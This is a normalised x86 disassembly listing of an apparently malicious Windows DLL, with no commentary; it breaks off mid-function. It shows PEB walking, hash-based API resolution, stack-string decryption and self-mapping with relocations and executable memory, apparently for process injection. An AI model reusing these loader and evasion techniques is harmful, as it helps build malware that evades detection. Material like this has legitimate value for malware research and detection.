sub_1000100c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
push esi
cmp eax 0x1a
ja r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_10001128 ]
mov esi r--data
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
pop esi
pop ebp
retn
push 0x0
push r--data
push esi
call sub_10002bf3
pop ecx
push eax
push esi
call sub_10002c12
add esp 0x10
jmp r-xdata
sub_10001194
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x12d
push esi
cmp eax ecx
jg r-xdata
mov ecx 0x191
cmp eax ecx
jg r-xdata
je r-xdata
mov ecx 0x25d
cmp eax ecx
jg r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
cmp eax 0x23
jg r-xdata
mov ecx 0x2bd
cmp eax ecx
jg r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
add eax 0xfffffed2
cmp eax 0x8
ja r-xdata
push 0x0
push r--data
push esi
call sub_10002bf3
pop ecx
push eax
push esi
call sub_10002c12
add esp 0x10
jmp r-xdata
cmp eax 0x65
jg r-xdata
je r-xdata
xor eax eax
je r-xdata
mov esi r--data
jmp r-xdata
mov ecx 0x197
cmp eax ecx
jg r-xdata
jmp [ eax * 4 + jump_table_10001790 ]
pop esi
pop ebp
retn
mov ecx 0xc9
cmp eax ecx
jg r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
cmp eax 0x21
ja r-xdata
mov esi r--data
jmp r-xdata
add eax 0xfffffda2
cmp eax 0x8
ja r-xdata
sub eax 0x1f5
je r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
cmp eax 0xca
jne r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
add eax 0xffffffdc
cmp eax 0x14
ja r-xdata
jmp [ eax * 4 + jump_table_1000168c ]
jmp [ eax * 4 + jump_table_100017b4 ]
mov esi r--data
jmp r-xdata
sub eax 0x64
je r-xdata
mov esi r--data
jmp r-xdata
sub eax 0x192
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
add eax 0xffffff9a
cmp eax 0x9
ja r-xdata
jmp [ eax * 4 + jump_table_10001714 ]
mov esi r--data
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
jmp [ eax * 4 + jump_table_10001768 ]
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
jne r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
jne r-xdata
mov esi r--data
jmp r-xdata
sub_100017df
push ebp
mov ebp esp
mov eax [ fs : 0x30 ]
push esi
push edi
mov edi [ eax + 0xc ]
add edi 0xc
mov esi [ edi ]
jmp r-xdata
cmp esi edi
jne r-xdata
movzx eax [ esi + 0x2c ]
push 0x1
push eax
push [ esi + 0x30 ]
call sub_10002ff1
add esp 0xc
cmp eax [ ebp + 0x8 ]
je r-xdata
xor eax eax
mov eax [ esi + 0x18 ]
jmp r-xdata
mov esi [ esi ]
pop edi
pop esi
pop ebp
retn
sub_10001836
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push esi
push 0x2e
push edi
call sub_10002d94
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
pop esi
sub eax edi
push eax
push edi
call sub_10002e26
push r--data
push r--data
push eax
mov [ ebp + 0x8 ] eax
call sub_10002e4c
push [ ebp + 0x8 ]
mov edi eax
call sub_10002139
add esp 0x18
inc esi
cmp [ esi ] 0x23
jne r-xdata
pop edi
pop ebp
retn
push 0x0
push 0x0
push esi
call sub_10003050
push eax
push 0x0
push edi
call sub_10001ea2
add esp 0x18
inc esi
push esi
call sub_10002d73
push eax
push 0x0
push edi
call sub_10001ea2
add esp 0x10
jmp r-xdata
sub_100018d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp ecx 0x242
ja r-xdata
xor al al
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax * 4 + rw-data ] ecx
mov al 0x1
pop ebp
retn
sub_100018f3
push ebp
mov ebp esp
push 0x2b
call sub_100018b4
mov edx eax
pop ecx
test edx edx
jne r-xdata
push [ ebp + 0x8 ]
call edx
pop ebp
retn
push 0xa48d6762
push 0x1
push eax
call sub_10001ea2
mov edx eax
push edx
push 0x2b
call sub_100018d0
add esp 0x14
sub_10001925
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x3c ]
lea eax [ eax + ecx + 0x18 ]
push ebx
push esi
mov esi [ eax + 0x60 ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
shr eax 0x10
add esi ecx
push edi
test ax ax
jne r-xdata
xor eax eax
leave
retn
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
and [ ebp - 0x4 ] 0x0
add edi ecx
add ebx ecx
cmp [ esi + 0x18 ] 0x0
jbe r-xdata
movzx eax [ ebp + 0xc ]
sub eax [ esi + 0x10 ]
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
test eax eax
jns r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
push 0x0
add eax ecx
push 0x0
push eax
call sub_10003050
add esp 0xc
cmp eax [ ebp + 0xc ]
je r-xdata
mov edx [ esi + 0x1c ]
lea eax [ edx + eax * 4 ]
mov eax [ eax + ecx ]
add eax ecx
cmp eax esi
jbe r-xdata
movzx eax [ ebx ]
mov ecx [ ebp + 0x8 ]
add edi 0x4
add ebx 0x2
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x18 ]
jb r-xdata
mov ecx eax
sub ecx esi
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
jmp r-xdata
push eax
call sub_10001836
pop ecx
sub_100019d2
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_100018b4
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0x14 ]
push edi
xor edi edi
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
call sub_10001194
pop ecx
mov ebx eax
push [ ebp + 0xc ]
call sub_1000100c
mov edi eax
push edi
call sub_100018f3
pop ecx
pop ecx
call sub_1000181c
jmp r-xdata
push ebx
push eax
call sub_10001f34
pop ecx
pop ecx
mov esi eax
test edi edi
je r-xdata
push edi
call sub_10001a59
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push edi
call sub_10002139
pop ecx
push esi
push [ ebp + 0x8 ]
call sub_100018d0
pop ecx
pop ecx
pop edi
pop ebx
push ebx
call sub_10002139
pop ecx
sub_10001a59
push ebp
mov ebp esp
sub esp 0x20
push edi
xor eax eax
mov [ ebp - 0x20 ] 0x0
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] 0xa2a17128
mov [ ebp - 0xc ] 0x2c821fb0
mov [ ebp - 0x8 ] 0x2729fc95
mov [ ebp - 0x4 ] 0x0
call sub_10002bf3
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_10004144
lea eax [ ebp - 0x20 ]
push eax
call sub_10002bf3
add esp 0x14
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_1000328f
push eax
call sub_10003b37
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x1
push 0x2
call sub_100019d2
add esp 0x1c
push [ ebp + 0x8 ]
call eax
pop edi
leave
retn 0x4
sub_10001b1a
push ebp
mov ebp esp
push 0x0
push 0xa
push 0x1
push 0x19
call sub_100019d2
add esp 0x10
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001b88
push ebp
mov ebp esp
push 0x0
push 0x2
push 0x1
push 0x26
call sub_100019d2
add esp 0x10
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001bb1
push ebp
mov ebp esp
push 0x0
push 0x1
push 0x1
push 0x28
call sub_100019d2
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001c07
push ebp
mov ebp esp
push 0x0
push 0x15
push 0x1
push 0x56
call sub_100019d2
add esp 0x10
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001c27
push ebp
mov ebp esp
push 0x0
push 0xb
push 0x1
push 0x5a
call sub_100019d2
add esp 0x10
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001ca4
push ebp
mov ebp esp
sub esp 0x20
push edi
xor eax eax
mov [ ebp - 0x20 ] 0x0
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] 0x96b47b23
mov [ ebp - 0xc ] 0x3b83198e
mov [ ebp - 0x8 ] 0x318fd87
mov [ ebp - 0x4 ] 0x26dd
mov [ ebp - 0x2 ] 0x0
call sub_10002bf3
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_10004144
lea eax [ ebp - 0x20 ]
push eax
call sub_10002bf3
add esp 0x14
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_1000328f
push eax
call sub_10003b37
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x1
push 0x93
call sub_100019d2
add esp 0x1c
call eax
pop edi
leave
retn
sub_10001d25
push ebp
mov ebp esp
sub esp 0x18
push edi
xor eax eax
mov [ ebp - 0x18 ] 0x0
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] 0xb6a17b2c
mov [ ebp - 0x8 ] 0x318c1abd
mov [ ebp - 0x4 ] 0x97
call sub_10002bf3
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_10004144
lea eax [ ebp - 0x18 ]
push eax
call sub_10002bf3
add esp 0x14
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_1000328f
push eax
call sub_10003b37
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x1
push 0x94
call sub_100019d2
add esp 0x1c
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop edi
leave
retn
sub_10001da2
push ebp
mov ebp esp
push 0x0
push 0xf
push 0x1
push 0x95
call sub_100019d2
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001dc8
push ebp
mov ebp esp
sub esp 0x18
push edi
xor eax eax
mov [ ebp - 0x18 ] 0x0
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] 0xb6a17b2c
mov [ ebp - 0x8 ] 0x3b8504ba
mov [ ebp - 0x4 ] 0x0
call sub_10002bf3
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_10004144
lea eax [ ebp - 0x18 ]
push eax
call sub_10002bf3
add esp 0x14
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_1000328f
push eax
call sub_10003b37
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x1
push 0x97
call sub_100019d2
add esp 0x1c
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop edi
leave
retn 0xc
sub_10001e44
push ebp
mov ebp esp
push 0x0
push 0x6f
push 0x5
push 0x1a2
call sub_100019d2
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001e6a
push ebp
mov ebp esp
push 0x0
push 0x65
push 0x5
push 0x1a4
call sub_100019d2
add esp 0x10
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001ea2
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] esi
jne r-xdata
call sub_1000181c
mov esi eax
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100018f3
mov esi eax
pop ecx
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1000100c
pop ecx
mov [ ebp + 0x8 ] eax
test esi esi
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_10001a59
mov esi eax
cmp [ ebp + 0x8 ] esi
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_10001925
pop ecx
pop ecx
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
sub_10001f02
push ebp
mov ebp esp
push [ ebp + 0x14 ]
call sub_100018b4
mov edx eax
pop ecx
test edx edx
jne r-xdata
mov eax edx
pop ebp
retn
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001ea2
mov edx eax
push edx
push [ ebp + 0x14 ]
call sub_100018d0
add esp 0x14
sub_10001f34
push ebp
mov ebp esp
push 0x7
push 0x1fc0eaee
push 0x1
push 0x0
call sub_10001f02
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001f54
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn
push esi
push edi
pop edi
pop esi
add ecx 0xfffffff8
xor edi edi
lea edx [ eax + 0x8 ]
test ecx 0xfffffffe
jbe r-xdata
add eax [ eax + 0x4 ]
mov ecx eax
sub ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0x14 ]
jb r-xdata
movzx esi [ edx ]
mov ecx esi
and ecx 0xfff
add ecx [ eax ]
shr si 0xc
cmp si 0x3
je r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
add ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
add [ ecx ] esi
cmp si 0xa
jne r-xdata
mov ecx [ eax + 0x4 ]
sub ecx 0x8
add edx 0x2
inc edi
shr ecx 0x1
cmp edi ecx
jb r-xdata
sub_10001fbf
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and eax 0xffff0000
mov edx 0x1000
mov eax sub_10001fbf
sub eax edx
jmp r-xdata
mov ecx [ eax + 0x3c ]
cmp ecx edx
jge r-xdata
mov ecx 0x5a4d
cmp [ eax ] cx
jne r-xdata
cmp [ ecx + eax ] 0x4550
je r-xdata
pop ebp
retn 0x4
sub_10001ffa
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0xc ]
call sub_10001fbf
mov ebx eax
mov esi [ ebx + 0x3c ]
mov eax [ esi + ebx + 0x50 ]
xor edi edi
push edi
push eax
push edi
push 0x40
push edi
push 0xffffffff
mov [ ebp - 0x8 ] eax
call sub_10001b88
push edi
push edi
push edi
push 0x2
push eax
mov [ ebp - 0x10 ] eax
call sub_10001bb1
add esp 0x2c
mov [ ebp - 0xc ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x8 ]
push ebx
push eax
call sub_100021aa
or [ ebp - 0x18 ] 0xffffffff
push 0x40
push edi
push 0x1
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
push [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edi
call sub_10001e6a
add esp 0x34
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi [ ebp - 0x18 ]
push [ esi + ebx + 0xa4 ]
mov eax [ ebp - 0x4 ]
sub eax ebx
push eax
mov eax [ esi + ebx + 0xa0 ]
push [ ebp - 0xc ]
add eax ebx
push eax
call sub_10001f54
mov esi [ ebp - 0x4 ]
sub esi ebx
add esp 0x10
add esi [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0xc ]
call sub_10001bd7
push [ ebp - 0x10 ]
call sub_10001ad4
pop ecx
pop ecx
mov eax esi
sub_100020c3
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
xor ebx ebx
push ebx
push 0x43a
call sub_10001c27
push [ ebp + 0xc ]
mov esi eax
push esi
call sub_10001ffa
add esp 0x14
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10001ad4
pop ecx
pop esi
mov al bl
pop ebx
pop ebp
retn
push ebx
push ebx
push [ ebp + 0x10 ]
push eax
push ebx
push ebx
push esi
call sub_10001b1a
add esp 0x1c
test eax eax
setne bl
sub_10002139
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
push 0x8
call sub_10001ca4
push eax
call sub_10001dc8
pop ebp
retn
sub_10002158
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jne r-xdata
push [ ebp + 0xc ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0x8 ]
push 0x8
call sub_10001ca4
push eax
call sub_10001da2
add esp 0x10
pop ebp
retn
push 0x8
call sub_10001ca4
push eax
call sub_10001d25
add esp 0xc
pop ebp
retn
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
push 0x8
call sub_10001ca4
push eax
call sub_10001dc8
sub_100021aa
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov ecx esi
je r-xdata
sub edx esi
mov al [ edx + ecx ]
dec [ ebp + 0x10 ]
mov [ ecx ] al
inc ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub_100021da
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov cl [ ebp + 0xc ]
dec [ ebp + 0x10 ]
mov [ eax ] cl
inc eax
sub_100021f7
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
push esi
cmp ecx eax
je r-xdata
or eax 0xffffffff
mov esi [ ebp + 0xc ]
cmp esi eax
je r-xdata
push edi
xor edi edi
cmp [ ebp + 0x10 ] eax
jbe r-xdata
pop edi
jmp r-xdata
sub esi ecx
push ebx
pop esi
pop ebp
retn
or eax 0xffffffff
jmp r-xdata
ja r-xdata
pop ebx
xor eax eax
inc eax
inc ecx
inc edi
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov dl [ ecx ]
mov bl [ esi + ecx ]
cmp dl bl
jb r-xdata
jmp r-xdata
sub_1000224e
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor al al
cmp [ ebp + 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp [ ebp + 0x24 ] ebx
je r-xdata
cmp [ ebp + 0x28 ] ebx
je r-xdata
cmp [ ebp + 0x2c ] ebx
je r-xdata
push esi
push edi
mov esi 0x104
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
add esp 0x48
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push 0x10000
push ebx
mov edi rw-data
push edi
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
mov esi rw-data
push esi
call sub_100021da
push [ ebp + 0x8 ]
call sub_10002bf3
add esp 0x40
push eax
push [ ebp + 0x8 ]
push rw-data
call sub_100021aa
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ rw-data ] eax
call sub_10002bf3
push eax
push [ ebp + 0x10 ]
push rw-data
call sub_100021aa
push [ ebp + 0x14 ]
call sub_10002bf3
push eax
push [ ebp + 0x14 ]
push rw-data
call sub_100021aa
push [ ebp + 0x18 ]
call sub_10002bf3
push eax
push [ ebp + 0x18 ]
push rw-data
call sub_100021aa
push [ ebp + 0x1c ]
call sub_10002bf3
add esp 0x40
push eax
push [ ebp + 0x1c ]
push rw-data
call sub_100021aa
push [ ebp + 0x20 ]
call sub_10002bf3
push eax
push [ ebp + 0x20 ]
push rw-data
call sub_100021aa
push [ ebp + 0x24 ]
call sub_10002bf3
push eax
push [ ebp + 0x24 ]
push rw-data
call sub_100021aa
push [ ebp + 0x28 ]
call sub_10002bf3
push eax
push [ ebp + 0x28 ]
push rw-data
call sub_100021aa
push [ ebp + 0x2c ]
call sub_10002bf3
add esp 0x40
push eax
push [ ebp + 0x2c ]
push edi
call sub_100021aa
add esp 0xc
cmp [ ebp + 0x38 ] bl
jne r-xdata
push [ ebp + 0x34 ]
call sub_10002bf3
push eax
push [ ebp + 0x34 ]
push esi
call sub_100021aa
mov al [ ebp + 0x38 ]
add esp 0x10
pop edi
mov [ rw-data ] al
mov al 0x1
pop esi
jmp r-xdata
push [ ebp + 0x30 ]
call sub_10002bf3
push eax
push [ ebp + 0x30 ]
push rw-data
call sub_100021aa
add esp 0x10
pop ebx
pop ebp
retn
sub_1000243a
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor al al
cmp [ ebp + 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp [ ebp + 0x24 ] ebx
je r-xdata
cmp [ ebp + 0x28 ] ebx
je r-xdata
cmp [ ebp + 0x2c ] ebx
je r-xdata
push esi
push edi
mov esi 0x104
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
add esp 0x48
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push 0x10000
push ebx
mov edi rw-data
push edi
call sub_100021da
push esi
push ebx
push rw-data
call sub_100021da
push esi
push ebx
mov esi rw-data
push esi
call sub_100021da
push [ ebp + 0x8 ]
call sub_10002bf3
add esp 0x40
push eax
push [ ebp + 0x8 ]
push rw-data
call sub_100021aa
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ rw-data ] eax
call sub_10002bf3
push eax
push [ ebp + 0x10 ]
push rw-data
call sub_100021aa
push [ ebp + 0x14 ]
call sub_10002bf3
push eax
push [ ebp + 0x14 ]
push rw-data
call sub_100021aa
push [ ebp + 0x18 ]
call sub_10002bf3
push eax
push [ ebp + 0x18 ]
push rw-data
call sub_100021aa
push [ ebp + 0x1c ]
call sub_10002bf3
add esp 0x40
push eax
push [ ebp + 0x1c ]
push rw-data
call sub_100021aa
push [ ebp + 0x20 ]
call sub_10002bf3
push eax
push [ ebp + 0x20 ]
push rw-data
call sub_100021aa
push [ ebp + 0x24 ]
call sub_10002bf3
push eax
push [ ebp + 0x24 ]
push rw-data
call sub_100021aa
push [ ebp + 0x28 ]
call sub_10002bf3
push eax
push [ ebp + 0x28 ]
push rw-data
call sub_100021aa
push [ ebp + 0x2c ]
call sub_10002bf3
add esp 0x40
push eax
push [ ebp + 0x2c ]
push edi
call sub_100021aa
add esp 0xc
cmp [ ebp + 0x38 ] bl
jne r-xdata
push [ ebp + 0x34 ]
call sub_10002bf3
push eax
push [ ebp + 0x34 ]
push esi
call sub_100021aa
mov al [ ebp + 0x38 ]
add esp 0x10
pop edi
mov [ rw-data ] al
mov al 0x1
pop esi
jmp r-xdata
push [ ebp + 0x30 ]
call sub_10002bf3
push eax
push [ ebp + 0x30 ]
push rw-data
call sub_100021aa
add esp 0x10
pop ebx
pop ebp
retn
sub_10002626
push ebp
mov ebp esp
push 0x1e3
push 0x8593dd7
push 0x8
push 0x0
call sub_10001f02
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10002652
push ebp
mov ebp esp
push 0x1d7
push 0x1ad09c78
push 0x8
push 0x0
call sub_10001f02
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_1000267b
push ebp
mov ebp esp
push 0x1d2
push 0x9f13856a
push 0x8
push 0x0
call sub_10001f02
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
